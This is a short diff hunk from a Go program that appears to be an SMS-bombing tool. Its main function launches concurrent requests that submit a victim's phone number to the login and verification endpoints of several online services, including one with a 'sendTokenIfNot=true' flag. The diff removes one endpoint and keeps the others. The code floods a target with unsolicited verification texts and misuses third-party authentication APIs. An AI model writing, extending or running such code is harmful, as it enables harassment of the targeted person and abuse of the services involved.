@@ -564,9 +564,6 @@ func main() {
 		go sms("https://apollo.digify.shop/graphql", map[string]interface{}{
 			s8: phone,
 		}, ch)
-		go sms(fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
-			"monsmain": "phone",
-		}, ch)
 		go sms(fmt.Sprintf("https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=%v&source=2&sendTokenIfNot=true", phone), map[string]interface{}{
 			"monsmain": "phone",
 		}, ch)
